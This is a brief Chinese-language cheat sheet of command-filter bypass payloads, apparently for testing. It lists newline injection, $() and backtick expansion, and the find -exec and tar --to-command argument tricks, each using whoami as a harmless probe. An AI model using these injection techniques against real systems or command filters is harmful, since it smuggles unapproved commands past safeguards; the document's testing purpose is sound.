# 终端过滤绕过载荷按技术类型整理最小测试样例。

# 换行注入

|载荷|常用Shell|可能绕过|预期结果|
|---|---|---|---|
| `ls%0awhoami`|bash、zsh、sh|只看首行的过滤器|同时执行两条命令|
| `ls\nwhoami`|bash、zsh、sh|字符串换行处理错误|同时执行两条命令|
| `ls\rwhoami`|bash、zsh|不处理回车的过滤器|两条命令都被解释|

# Shell展开

|载荷|目的|
|---|---|
| `echo$(whoami)`|测试子命令展开|
| ``echo`whoami` ``|测试反引号|

# 危险参数

|载荷|目的|
|---|---|
| `find . -exec whoami \\;`|测试`find -exec` |
| `tar --to-command=whoami -xf test.tar`|测试危险参数|

# 注意

- 先用无害命令验证
- 按Shell分开记录
- 区分通过检查与真正执行
